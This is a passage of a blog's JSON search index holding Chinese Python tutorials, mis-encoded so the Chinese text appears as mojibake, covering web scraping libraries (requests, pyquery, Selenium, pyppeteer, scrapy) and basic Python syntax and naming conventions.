å‚è€ƒèµ„æ–™\n\n+ https://github.com/miyakogi/pyppeteer\n+ [Pythonçˆ¬è™«å…¥é—¨æ•™ç¨‹ 24-100 å¾®åŒ»æŒ‚å·ç½‘åŒ»ç”Ÿæ•°æ®æŠ“å–](https://juejin.im/post/5c35944b6fb9a049de6d8dd2)\n+ [Pythonä¸­ä¸seleniumé½åçš„pyppeteeråº“](https://zhuanlan.zhihu.com/p/63634783)\n+ [pyppeteerä½¿ç”¨é‡åˆ°çš„bugåŠè§£å†³æ–¹æ³•](https://www.sanfenzui.com/pyppeteer-bug-collection.html)\n+ https://juejin.im/post/59e5a86c51882578bf185dba","tags":["çˆ¬è™«"],"categories":["python"]},{"title":"pythonçˆ¬è™«åŸºç¡€","url":"%2Fp%2F2412099c.html","content":"\n\n\n# 0. å‰è¨€\n\nç½‘ç»œçˆ¬è™«ï¼ˆåˆè¢«ç§°ä¸ºç½‘é¡µèœ˜è››ï¼Œç½‘ç»œæœºå™¨äººï¼Œåœ¨FOAFç¤¾åŒºä¸­é—´ï¼Œæ›´ç»å¸¸çš„ç§°ä¸ºç½‘é¡µè¿½é€è€…ï¼‰ï¼Œæ˜¯ä¸€ç§æŒ‰ç…§ä¸€å®šçš„è§„åˆ™ï¼Œè‡ªåŠ¨çš„æŠ“å–ä¸‡ç»´ç½‘ä¿¡æ¯çš„ç¨‹åºæˆ–è€…è„šæœ¬ã€‚\n\næˆ‘è®¤ä¸ºä¸€æ¬¡çˆ¬è™«çš„è¿‡ç¨‹, å°±æ˜¯ç½‘ç»œè¯·æ±‚åˆ°æ•°æ®å, å¤„ç†æ•°æ®, ç„¶åå‘é€æ•°æ®çš„è¿‡ç¨‹.\n\n<!-- more -->\n\n# 1. ç½‘ç»œè¯·æ±‚(requests)\n\n pythonç½‘ç»œè¯·æ±‚ä¸»è¦æœ‰ `urllib` å’Œ `requests`  åº“, å¢™è£‚æ¨è`requests`\n\n```python\nimport requests\n\nurl = 'http://www.baidu.com'\nresponse = requests.get(url)\nhtml = response.text\nprint(html)\n\n\nimport requests\n\nurl = \"http://docs.python-requests.org/zh_CN/latest/_static/requests-sidebar.png\"\nresponse = requests.get(url)\nwith open('image.png','wb') as f:\n  f.write(response.content)\n```\n\n\n\n# 2. æ•°æ®æå– (pyquery)\n\nä¸€èˆ¬æˆ‘ä»¬è¯·æ±‚çš„æ•°æ®ä¸»è¦åˆ†ä»¥ä¸‹å‡ ç±»:\n\n+ html, xml\n+ json\n+ å­—ç¬¦ä¸²\n\nå¯¹äº html, xml æˆ‘ä»¬è¦ä½¿ç”¨ç›¸å…³çš„åº“è¿›è¡Œå¤„ç†, jsonç›´æ¥ååºåˆ—åŒ–å¤„ç†, å­—ç¬¦ä¸²å¯èƒ½éœ€è¦å­—ç¬¦ä¸²åŒ¹é… å’Œ æ­£åˆ™è¡¨è¾¾å¼ å¤„ç†\n\n\n\n> å¯¹html/xml å¤„ç†çš„åº“ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§:\n\n### 2.1 beautifulsoup\n\n```bash\npip install beautifulsoup4\n```\n\nbeautiful Soupå°†å¤æ‚HTMLæ–‡æ¡£è½¬æ¢æˆä¸€ä¸ªå¤æ‚çš„æ ‘å½¢ç»“æ„,æ¯ä¸ªèŠ‚ç‚¹éƒ½æ˜¯Pythonå¯¹è±¡\n\n### 2.2 lxml\n\nlxml ä½¿ç”¨çš„æ˜¯ xpath æŠ€æœ¯\n\n```bash\npip install lxml\n```\n\n### 2.3  lxml, beautifulSoup å¯¹æ¯”\n\nBeautifulSoupæ˜¯ä¸€ä¸ªåº“ï¼Œè€ŒXPathæ˜¯ä¸€ç§æŠ€æœ¯ï¼Œpythonä¸­æœ€å¸¸ç”¨çš„XPathåº“æ˜¯lxmlï¼Œå› æ­¤ï¼Œè¿™é‡Œå°±æ‹¿lxmlæ¥å’ŒBeautifulSoupåšæ¯”è¾ƒå§.\n\n+ æ€§èƒ½ lxml >> BeautifulSoup\n\nBeautifulSoupå’Œlxmlçš„åŸç†ä¸ä¸€æ ·ï¼ŒBeautifulSoupæ˜¯åŸºäºDOMçš„ï¼Œä¼šè½½å…¥æ•´ä¸ªæ–‡æ¡£ï¼Œè§£ææ•´ä¸ªDOMæ ‘ï¼Œå› æ­¤æ—¶é—´å’Œå†…å­˜å¼€é”€éƒ½ä¼šå¤§å¾ˆå¤šã€‚è€Œlxmlåªä¼šå±€éƒ¨éå†ï¼Œå¦å¤–lxmlæ˜¯ç”¨cå†™çš„ï¼Œè€ŒBeautifulSoupæ˜¯ç”¨pythonå†™çš„ï¼Œå› æ­¤æ€§èƒ½æ–¹é¢è‡ªç„¶ä¼šå·®å¾ˆå¤šã€‚\n\n+ æ˜“ç”¨æ€§ BeautifulSoup >> lxml\n\nBeautifulSoupç”¨èµ·æ¥æ¯”è¾ƒç®€å•ï¼ŒAPIéå¸¸äººæ€§åŒ–ï¼Œæ”¯æŒcssé€‰æ‹©å™¨ã€‚lxmlçš„XPathå†™èµ·æ¥éº»çƒ¦ï¼Œå¼€å‘æ•ˆç‡ä¸å¦‚BeautifulSoupã€‚\n\n```\ntitle = soup.select('.content div.title h3')\n```\n\nåŒæ ·çš„ä»£ç ç”¨Xpathå†™èµ·æ¥ä¼šå¾ˆéº»çƒ¦\n\n```\ntitle = tree.xpath(\"//*[@class='content']/div[@class='content']/h3\")\n```\n\n### 2.4. pyquery \n\npyquery å¯è®©ä½ ç”¨ jQuery çš„è¯­æ³•æ¥å¯¹ html/xml è¿›è¡Œæ“ä½œã€‚è¿™å’Œ jQuery ååˆ†ç±»ä¼¼ã€‚è¿™ä¸ªåº“ä¸æ˜¯ï¼ˆè‡³å°‘è¿˜ä¸æ˜¯ï¼‰ä¸€ä¸ªå¯ä»¥å’Œ JavaScriptäº¤äº’çš„ä»£ç åº“ï¼Œå®ƒåªæ˜¯éå¸¸åƒ jQuery API è€Œå·²ã€‚\n\n```bash\npip install pyquery\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­:\n\n```python\n    def parse_html(self,content):\n        doc = pq(content)\n        items = doc(\".dt\").items()\n        for item in items:\n            title = item.find(\"center\").text()\n            for i in item.find(\"th\").items():\n                category = i.find(\"a\").eq(0).text()\n                neirong = i.find(\"a\").eq(1).text()\n                url = i.find(\"a\").eq(1).attr('href')\n\n                one_data = {\n                    \"category\": category,\n                    \"context\": neirong,\n                    \"url\": url,\n                }\n                print(one_data)\n```\n\n\n\n# 3. æ— å¤´æµè§ˆå™¨(pyppeteer)\n\nä»¥å‰å†™çˆ¬è™«ï¼Œé‡åˆ°éœ€è¦ç™»å½•çš„é¡µé¢ï¼Œä¸€èˆ¬éƒ½æ˜¯é€šè¿‡chromeçš„æ£€æŸ¥å…ƒç´ ï¼ŒæŸ¥çœ‹ç™»å½•éœ€è¦çš„å‚æ•°å’ŒåŠ å¯†æ–¹æ³•ï¼Œå¦‚æœç½‘ç«™çš„åŠ å¯†éå¸¸å¤æ‚ï¼Œä¾‹å¦‚ç™»å½•qqçš„ï¼Œå°±ä¼šå¾ˆè›‹ç–¼ã€‚\n\nç°åœ¨æœ‰äº†æ— å¤´æµè§ˆå™¨ï¼Œå†ä¹Ÿä¸éœ€è¦è€ƒè™‘ç™»å½•çš„å‚æ•°å’ŒåŠ å¯†äº†ï¼Œç”¨æ— å¤´æµè§ˆå™¨æ‰“å¼€é¡µé¢ï¼Œé€šè¿‡JSæˆ–JQueryè¯­å¥ï¼Œå¡«å…¥è´¦å·å’Œå¯†ç ï¼Œç„¶åç‚¹å‡»ç™»é™†ï¼Œç„¶åæŠŠCookiesä¿å­˜ä¸‹æ¥ï¼Œå°±å¯ä»¥æ¨¡æ‹Ÿç™»é™†äº†ã€‚\n\n\n\n### 3.1 PhantomJS(æš‚åœå¼€å‘)\n\n```\nserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead\n\næ–°ç‰ˆæœ¬çš„Seleniumä¸å†æ”¯æŒPhantomJSäº†ï¼Œè¯·ä½¿ç”¨Chromeæˆ–Firefoxçš„æ— å¤´ç‰ˆæœ¬æ¥æ›¿ä»£ã€‚\n```\n\n\n\nPhantomJSæ˜¯ä¸€ä¸ªæ— ç•Œé¢çš„,å¯è„šæœ¬ç¼–ç¨‹çš„WebKitæµè§ˆå™¨å¼•æ“ã€‚å®ƒåŸç”Ÿæ”¯æŒå¤šç§web æ ‡å‡†ï¼šDOM æ“ä½œï¼ŒCSSé€‰æ‹©å™¨ï¼ŒJSONï¼ŒCanvas ä»¥åŠSVGã€‚å› æ­¤å¯ä»¥æ¯”æµè§ˆå™¨æ›´åŠ å¿«é€Ÿçš„è§£æå¤„ç†jsåŠ è½½ã€‚\n\n\n\næœ‰æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æµè§ˆå™¨å¤„ç†ç½‘é¡µï¼Œä½†å¹¶ä¸éœ€è¦æµè§ˆï¼Œæ¯”å¦‚ç”Ÿæˆç½‘é¡µçš„æˆªå›¾ã€æŠ“å–ç½‘é¡µæ•°æ®ç­‰æ“ä½œã€‚[PhantomJS](http://phantomjs.org/)çš„åŠŸèƒ½ï¼Œå°±æ˜¯æä¾›ä¸€ä¸ªæµè§ˆå™¨ç¯å¢ƒçš„å‘½ä»¤è¡Œæ¥å£ï¼Œä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œä¸€ä¸ªâ€œè™šæ‹Ÿæµè§ˆå™¨â€ï¼Œé™¤äº†ä¸èƒ½æµè§ˆï¼Œå…¶ä»–ä¸æ­£å¸¸æµè§ˆå™¨ä¸€æ ·ã€‚å®ƒçš„å†…æ ¸æ˜¯WebKitå¼•æ“ï¼Œä¸æä¾›å›¾å½¢ç•Œé¢ï¼Œåªèƒ½åœ¨å‘½ä»¤è¡Œä¸‹ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒå®Œæˆä¸€äº›ç‰¹æ®Šçš„ç”¨é€”ã€‚\n\n\n\nä¸‹è½½: https://phantomjs.org/download.html , ç„¶åæŠŠäºŒè¿›åˆ¶æ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹, å¢åŠ ä¸ª$PATH æŒ‡å®šå³å¯\n\n```\nphantomjs -v\n```\n\n\n\n### 3.2. selenium\n\nselenium æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯ï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·ã€‚å®ƒæ”¯æŒå„ç§æµè§ˆå™¨ï¼ŒåŒ…æ‹¬ Chromeï¼ŒSafariï¼ŒFirefox ç­‰ä¸»æµç•Œé¢å¼æµè§ˆå™¨ã€‚æ¢å¥è¯è¯´å« Selenium æ”¯æŒè¿™äº›æµè§ˆå™¨é©±åŠ¨ã€‚è¯è¯´å›æ¥ï¼ŒPhantomJSä¸ä¹Ÿæ˜¯ä¸€ä¸ªæµè§ˆå™¨å—ï¼Œé‚£ä¹ˆ Selenium æ”¯æŒä¸ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œè¿™æ ·äºŒè€…ä¾¿å¯ä»¥å®ç°æ— ç¼å¯¹æ¥äº†ã€‚æœ‰äººé—®ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨æµè§ˆå™¨è€Œç”¨ä¸€ä¸ªæ²¡ç•Œé¢çš„ PhantomJS å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ï¼šæ•ˆç‡é«˜ï¼\n\n\n\nå—¯ï¼Œæ‰€ä»¥å‘¢ï¼Ÿå®‰è£…ä¸€ä¸‹ Python çš„ Selenium åº“ï¼Œå†å®‰è£…å¥½ PhantomJSï¼Œä¸å°±å¯ä»¥å®ç° Pythonï¼‹Seleniumï¼‹PhantomJS çš„æ— ç¼å¯¹æ¥äº†å˜›ï¼Selenium ç”¨æ¥é©±åŠ¨æµè§ˆå™¨, PhantomJS ç”¨æ¥æ¸²æŸ“è§£æç•Œé¢, Python è¿›è¡ŒåæœŸçš„å¤„ç†ï¼Œå®Œç¾çš„ä¸‰å‰‘å®¢ï¼\n\n\n\n```\npip install selenium\n```\n\n\n\nç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­, é€šè¿‡ selenium é©±åŠ¨ [chrome driver](https://sites.google.com/a/chromium.org/chromedriver/downloads)æ‰“å¼€ç™¾åº¦æœç´¢å…³é”®è¯\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\nbrowser = webdriver.Chrome(executable_path=\"./drivers/chromedriver\")\nbrowser.get('http://www.baidu.com/')\n\nkw = browser.find_element_by_id(\"kw\")\nkw.send_keys(\"Selenium\", Keys.RETURN)\n```\n\n\n\n### 3.3. pyppeteer \n\npyppeteer æ˜¯ä¾èµ–äº chromium è¿™ä¸ªæµè§ˆå™¨æ¥è¿è¡Œçš„,  å¹¶ä¸”æ˜¯åŸºäº python çš„æ–°ç‰¹æ€§ async å®ç°çš„ï¼Œæ‰€ä»¥å®ƒçš„ä¸€äº›æ‰§è¡Œä¹Ÿæ”¯æŒå¼‚æ­¥æ“ä½œï¼Œæ•ˆç‡ç›¸å¯¹äº selenium æ¥è¯´ä¹Ÿæé«˜äº†ã€‚\n\n```bash\npip3 install pyppeteer\n```\n\næˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­, æ˜¯æ‰“å¼€baidu åæˆªå›¾\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://www.baidu.com')\n    await page.screenshot({'path': 'example.png'})\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n# 4. çˆ¬è™«æ¡†æ¶\n\n### 4.1 pyspider\n\npyspiderä¸Šæ‰‹æ›´ç®€å•ï¼Œæ“ä½œæ›´åŠ ç®€ä¾¿ï¼Œå› ä¸ºå®ƒå¢åŠ äº† WEB ç•Œé¢ï¼Œå†™çˆ¬è™«è¿…é€Ÿï¼Œé›†æˆäº†phantomjsï¼Œå¯ä»¥ç”¨æ¥æŠ“å–jsæ¸²æŸ“çš„é¡µé¢ã€‚\n\n```bash\npip install pyspider\n```\n\nå®‰è£…æˆåŠŸååœ¨ [python 3.7 ä¸‹è¿è¡Œå°±æŠ¥é”™](https://github.com/binux/pyspider/issues/817), çœ‹æ¥ä½œè€…å¾ˆä¹…æ²¡ç»´æŠ¤äº†\n\n\n\n\n### 4.2 scrapy\n\n```bash\npip install Scrapy\n```\n\nscrapyè‡ªå®šä¹‰ç¨‹åº¦é«˜ï¼Œæ¯” PySpideræ›´åº•å±‚ä¸€äº›ï¼Œé€‚åˆå­¦ä¹ ç ”ç©¶ï¼Œéœ€è¦å­¦ä¹ çš„ç›¸å…³çŸ¥è¯†å¤šï¼Œä¸è¿‡è‡ªå·±æ‹¿æ¥ç ”ç©¶åˆ†å¸ƒå¼å’Œå¤šçº¿ç¨‹ç­‰ç­‰æ˜¯éå¸¸åˆé€‚çš„ã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://cuiqingcai.com/1052.html\n+ https://cuiqingcai.com/6942.html\n+ https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero","tags":["çˆ¬è™«"],"categories":["çˆ¬è™«"]},{"title":"python_requestsçš„ä½¿ç”¨","url":"%2Fp%2F4a761254.html","content":"\n\n\nrequestæ˜¯ä¸€ä¸ªç®€ç­”ä¼˜é›…çš„python HTTPåº“ï¼Œç›¸è¾ƒäºpythonæ ‡å‡†åº“ä¸­çš„urllibå’Œurllib2çš„åº“ï¼Œrequestsæ›´åŠ çš„ä¾¿äºç†è§£å’Œä½¿ç”¨.\n\n\n\n### 1. å®‰è£… requests\n\n```bash\npip install requests\n```\n\n<!-- more -->\n\n### 2. requestsåŒ…çš„ä½¿ç”¨\n\n##### get\n\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}\n>>> r = requests.get('https://httpbin.org/get', params=payload)\n\n>>> print(r.url)\nhttps://httpbin.org/get?key2=value2&key1=value1\n```\n\n\n\n##### post\n\n```python\nimport requests\nimport json\n\nheaders = {'content-type': 'application/json'}\nurl = 'http://192.168.3.45:8080/api/v2/event/log'\n\ndata = {\"eventType\": \"AAS_PORTAL_START\", \"data\": {\"uid\": \"hfe3hf45huf33545\", \"aid\": \"1\", \"vid\": \"1\"}}\nparams = {'sessionKey': '9ebbd0b25760557393a43064a92bae539d962103', 'format': 'xml', 'platformId': 1}\n\nrequests.post(url, params=params, data=json.dumps(data), headers=headers, timeout=2)\n```\n\n\n\n##### parse \n\n```python\nimport requests\nrequests.get(url).json()\n```\n\n\n\n\n\n### 3. å‚è€ƒèµ„æ–™:\n\n+ https://2.python-requests.org//zh_CN/latest/user/quickstart.html","tags":["requests"],"categories":["python"]},{"title":"pythonåŸºç¡€å®è·µ","url":"%2Fp%2Fd319c20d.html","content":"\n### 1. æ¨¡å—\n\nPython æ¨¡å—(Module)ï¼Œæ˜¯ä¸€ä¸ª Python æ–‡ä»¶ï¼Œä»¥ .py ç»“å°¾ï¼ŒåŒ…å«äº† Python å¯¹è±¡å®šä¹‰å’ŒPythonè¯­å¥ã€‚\n\n```python\nfrom pkg.func import hello\n# pkg æ˜¯æ¨¡å—åå­—,å°±æ˜¯ç›®å½•åå­—\n# pkg.func æ˜¯ pkg ç›®å½•ä¸‹çš„ func æ–‡ä»¶\n# hello æ˜¯ func æ–‡ä»¶çš„ helloå‡½æ•°\n\n\nfrom pkg.topic import Topic\n# Topic æ˜¯ topic æ–‡ä»¶çš„ ç±»\n```\n\n\n\n+ `__init__.py` ,å¦‚æœç›®å½•ä¸­å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯¥ç›®å½•å°±ä¼šè¢«è¯†åˆ«ä¸º module package ã€‚\n+ `__init__.py` åœ¨åŒ…è¢«å¯¼å…¥æ—¶ä¼šè¢«æ‰§è¡Œã€‚è¯¥æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„pythonä»£ç æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥å°†åˆå§‹åŒ–ä»£ç æ”¾å…¥è¯¥æ–‡ä»¶ä¸­ã€‚\n\n<!-- more -->\n\n### 2. pythonå‘½åè§„èŒƒ\n\n##### 2.1 æ¨¡å—\n\n- æ¨¡å—å°½é‡ä½¿ç”¨å°å†™å‘½åï¼Œé¦–å­—æ¯ä¿æŒå°å†™ï¼Œå°½é‡ä¸è¦ç”¨ä¸‹åˆ’çº¿(é™¤éå¤šä¸ªå•è¯ï¼Œä¸”æ•°é‡ä¸å¤šçš„æƒ…å†µ)\n\n```python\n# æ­£ç¡®çš„æ¨¡å—å\nimport decoder\nimport html_parser\n\n# ä¸æ¨èçš„æ¨¡å—å\nimport Decoder\n```\n\n##### 2.2 ç±»å\n\n- ç±»åä½¿ç”¨é©¼å³°(CamelCase)å‘½åé£æ ¼ï¼Œé¦–å­—æ¯å¤§å†™ï¼Œç§æœ‰ç±»å¯ç”¨ä¸€ä¸ªä¸‹åˆ’çº¿å¼€å¤´\n\n```Python\nclass Farm():\n    pass\n\nclass AnimalFarm(Farm):\n    pass\n\nclass _PrivateFarm(Farm):\n    pass\n```\n\n- å°†ç›¸å…³çš„ç±»å’Œé¡¶çº§å‡½æ•°æ”¾åœ¨åŒä¸€ä¸ªæ¨¡å—é‡Œ. ä¸åƒJava, æ²¡å¿…è¦é™åˆ¶ä¸€ä¸ªç±»ä¸€ä¸ªæ¨¡å—.\n\n##### 2.3 å‡½æ•°\n\n- å‡½æ•°åä¸€å¾‹å°å†™ï¼Œå¦‚æœ‰å¤šä¸ªå•è¯ï¼Œç”¨ä¸‹åˆ’çº¿éš”å¼€\n\n```python\ndef run():\n    pass\n\ndef run_with_env():\n    pass\n```\n\n- ç§æœ‰å‡½æ•°åœ¨å‡½æ•°å‰åŠ ä¸€ä¸ªä¸‹åˆ’çº¿_\n\n```python\nclass Person():\n    def _private_func():\n        pass\n```\n\n##### 2.4 å˜é‡å\n\n- å˜é‡åå°½é‡å°å†™, å¦‚æœ‰å¤šä¸ªå•è¯ï¼Œç”¨ä¸‹åˆ’çº¿éš”å¼€\n\n```python\nif __name__ == '__main__':\n    count = 0\n    school_name = ''\n```\n\n##### 2.5 å¸¸é‡\n\n- å¸¸é‡ä½¿ç”¨ä»¥ä¸‹åˆ’çº¿åˆ†éš”çš„å¤§å†™å‘½å\n\n```python\nMAX_CLIENT = 100\nMAX_CONNECTION = 1000\nCONNECTION_TIMEOUT = 600\n```\n\n\n\n### 3. python æ–¹æ³•è¿”å›å¤šä¸ªå€¼\n\n```python\ndef f():\n    return True, False\n  \n  \nx, y = f()\nprint(x)\nprint(y)\n\ngives:\nTrue\nFalse\n```\n\n\n\n### 4. sprintf()æ ¼å¼åŒ–è¾“å‡º\n\n```python\n# å­—ç¬¦ä¸²\n'%s %s' % ('one', 'two')\n'{} {}'.format('one', 'two')\none two\n\n\n# int\n'%d %d' % (1, 2)\n'{} {}'.format(1, 2)\n1 2\n\n\n# float\n'%f' % (3.141592653589793,)\n'{:f}'.format(3.141592653589793)\n3.141593\n\n\n# é¡ºåº\n'{1} {0}'.format('one', 'two')\ntwo one\n```\n\n\n\n### 5.  forå¾ªç¯\n\n```python\n# for in å¾ªç¯\nfruits = [\"apple\", \"banana\", \"cherry\"]\nfor x in fruits:\n  print(x)\n  \n  \n# rangeå¾ªç¯\nfor x in range(2, 6):\n  print(x)#2 3 4 5\nfor x in range(2, 10, 3):\n  print(x)# 2 5 8\n  \n  \n\n# å¾ªç¯å¸¦ k, v\npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"]\nfor num, name in enumerate(presidents, start=1):\n    print(\"President {}: {}\".format(num, name))\n    \n  \n# å¾ªç¯å¤šä¸ª\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]\nratios = [0.2, 0.3, 0.1, 0.4]\nfor color, ratio in zip(colors, ratios):\n    print(\"{}% {}\".format(ratio * 100, color))\n    \n    \n# æ­»å¾ªç¯\nwhile True:\n  pass\n```\n\n\n\n### 6. `if __name__ == 'main'`\n\nä¸€ä¸ªpythonçš„æ–‡ä»¶æœ‰ä¸¤ç§ä½¿ç”¨çš„æ–¹æ³•ï¼Œç¬¬ä¸€æ˜¯ç›´æ¥ä½œä¸ºè„šæœ¬æ‰§è¡Œï¼Œç¬¬äºŒæ˜¯importåˆ°å…¶ä»–çš„pythonè„šæœ¬ä¸­è¢«è°ƒç”¨ï¼ˆæ¨¡å—é‡ç”¨ï¼‰æ‰§è¡Œã€‚\n\n\n\n`if __name__ == 'main'`: çš„ä½œç”¨å°±æ˜¯æ§åˆ¶è¿™ä¸¤ç§æƒ…å†µæ‰§è¡Œä»£ç çš„è¿‡ç¨‹ï¼Œåœ¨`if __name__ == 'main'`: ä¸‹çš„ä»£ç åªæœ‰åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼ˆå³æ–‡ä»¶ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼‰æ‰ä¼šè¢«æ‰§è¡Œï¼Œè€Œimportåˆ°å…¶ä»–è„šæœ¬ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚\n\n\n\n\n\n### 7. `__pycache__`\n\nåœ¨pythonä¸­è¿è¡Œç¨‹åºæ—¶ï¼Œè§£é‡Šå™¨é¦–å…ˆå°†å…¶ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨`__pycache__`æ–‡ä»¶å¤¹ã€‚å¦‚æœæ‚¨åœ¨é‚£é‡ŒæŸ¥æ‰¾ï¼Œæ‚¨å°†å‘ç°ä¸€å †æ–‡ä»¶å…±äº«çš„åç§°ã€‚åœ¨é¡¹ç›®æ–‡ä»¶å¤¹ä¸­çš„Pyæ–‡ä»¶ï¼Œåªæœ‰å®ƒä»¬çš„æ‰©å±•åæ‰æ˜¯å…¶ä¸­ä¹‹ä¸€.PYCæˆ–.pyo.ã€‚è¿™äº›åˆ†åˆ«æ˜¯å­—èŠ‚ç ç¼–è¯‘å’Œä¼˜åŒ–å­—èŠ‚ç ç¼–è¯‘ç‰ˆæœ¬çš„ç¨‹åºçš„æ–‡ä»¶ã€‚\n\n\nä¸‹æ¬¡å†æ‰§è¡Œå·¥ç¨‹æ—¶ï¼Œè‹¥è§£é‡Šå™¨å‘ç°è¿™ä¸ª *.py è„šæœ¬æ²¡æœ‰ä¿®æ”¹è¿‡ï¼Œå°±ä¼šè·³è¿‡ç¼–è¯‘è¿™ä¸€æ­¥ï¼Œç›´æ¥è¿è¡Œä»¥å‰ç”Ÿæˆçš„ä¿å­˜åœ¨ __pycache__æ–‡ä»¶å¤¹é‡Œçš„ *.pyc æ–‡ä»¶ã€‚\n\nè¿™æ ·å·¥ç¨‹è¾ƒå¤§æ—¶å°±å¯ä»¥å¤§å¤§ç¼©çŸ­é¡¹ç›®è¿è¡Œå‰çš„å‡†å¤‡æ—¶é—´ï¼›å¦‚æœä½ åªéœ€æ‰§è¡Œä¸€ä¸ªå°å·¥ç¨‹ï¼Œæ²¡å…³ç³» å¿½ç•¥è¿™ä¸ªæ–‡ä»¶å¤¹å°±è¡Œã€‚\n\n\n\n### 8. æ‰“å¼€æ–‡ä»¶è®¾ç½®ç¼–ç è¯»å–\n\n```python\nwith open(\"1.html\", \"r\", encoding='gbk') as f:\n  contents = f.read()\n  parse_html(contents)\n```\n\n\n\n### 9. è¯»å†™ json æ–‡ä»¶\n\n```python\nclass File(object):\n    def __init__(self):\n        self.name = \"zk8.json\"\n        if not os.path.exists(self.name): # æ²¡æœ‰å°±å†™ä¸€ä¸‹\n            with open(self.name, 'w'): pass\n\n\n    def save(self, data):\n        with open(self.name, 'w', encoding='utf-8') as f:\n            json.dump(data, f, ensure_ascii=False, indent=4)\n\n\n    def load(self):\n        with open(self.name, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n            return data\n\n```\n\n\n\n### 10. æ•°æ®ç»“æ„ æ“ä½œ\n\n```python\n############ list ############\n>>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana']\n>>> fruits.count('apple')\n2\n>>> fruits.count('tangerine')\n0\n>>> fruits.index('banana')\n3\n>>> fruits.index('banana', 4)  # Find next banana starting a position 4\n6\n>>> fruits.reverse()\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange']\n>>> fruits.append('grape')\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape']\n>>> fruits.sort()\n>>> fruits\n['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear']\n>>> fruits.pop()\n'pear'\n\n\n############ tuple ############\n\n>>> t = 12345, 54321, 'hello!'\n>>> t[0]\n12345\n>>> t\n(12345, 54321, 'hello!')\n>>> # Tuples may be nested:\n... u = t, (1, 2, 3, 4, 5)\n>>> u\n((12345, 54321, 'hello!'), (1, 2, 3, 4, 5))\n>>> # Tuples are immutable:\n... t[0] = 88888\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: 'tuple' object does not support item assignment\n>>> # but they can contain mutable objects:\n... v = ([1, 2, 3], [3, 2, 1])\n>>> v\n([1, 2, 3], [3, 2, 1])\n\n############ set ############\n\n>>> basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}\n>>> print(basket)                      # show that duplicates have been removed\n{'orange', 'banana', 'pear', 'apple'}\n>>> 'orange' in basket                 # fast membership testing\nTrue\n>>> 'crabgrass' in basket\nFalse\n\n>>> # Demonstrate set operations on unique letters from two words\n...\n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a                                  # unique letters in a\n{'a', 'r', 'b', 'c', 'd'}\n>>> a - b                              # letters in a but not in b\n{'r', 'd', 'b'}\n>>> a | b                              # letters in a or b or both\n{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}\n>>> a & b                              # letters in both a and b\n{'a', 'c'}\n>>> a ^ b                              # letters in a or b but not both\n{'r', 'd', 'b', 'm', 'z', 'l'}\n\n\n\n\n############ dict ############\n>>> tel = {'jack': 4098, 'sape': 4139}\n>>> tel['guido'] = 4127\n>>> tel\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n>>> tel['jack']\n4098\n>>> del tel['sape']\n>>> tel['irv'] = 4127\n>>> tel\n{'jack': 4098, 'guido': 4127, 'irv': 4127}\n>>> list(tel)\n['jack', 'guido', 'irv']\n>>> sorted(tel)\n['guido', 'irv', 'jack']\n>>> 'guido' in tel\nTrue\n>>> 'jack' not in tel\nFalse\n\n# é¿å… å¾ªç¯ä¸­åˆ é™¤ key æŠ¥é”™\nfor i in list(d):\n  del d[i]\n```\n\n\n\n\n\n### 11. ç±»çš„ç‰¹æ®Šå‡½æ•°\n\n```python\n# __init__ æ„é€ \nclass Foo:\n    def __init__(self, a, b, c):\nx = Foo(1, 2, 3) \n\n## __del__ ææ„\nclass FileObject:\n    def __del__(self):\n        self.file.close()\n        del self.file\n\n\n# __call__ ç±»å˜æˆå¯è°ƒç”¨\nclass Foo:\n    def __call__(self, a, b, c):\nx = Foo()\nx(1, 2, 3) \n\n\n#__getattr__ ä¸å­˜åœ¨çš„å±æ€§\nclass Dummy(object):\n    def __getattr__(self, attr):\n        return attr.upper()\nd = Dummy()\nd.does_not_exist # 'DOES_NOT_EXIST'\n```\n\n\n\n### 12. æšä¸¾\n\n```python\nfrom enum import Enum \nclass Animal(Enum):\n    ant = 